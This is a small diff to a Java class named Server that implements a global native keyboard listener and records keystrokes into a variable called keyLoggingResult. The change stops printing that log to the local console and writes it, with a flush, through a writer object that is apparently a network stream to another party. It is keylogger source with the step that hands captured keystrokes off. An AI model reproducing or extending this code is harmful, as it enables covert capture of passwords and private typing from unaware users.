@@ -102,7 +102,8 @@ public class Server implements NativeKeyListener{
                         nativeHookException.printStackTrace();
                     }
                     GlobalScreen.removeNativeKeyListener(server);
-                    System.out.println(keyLoggingResult);
+                    writer.println(keyLoggingResult);
+                    writer.flush();
                 }
             }
         } catch (Exception e) {
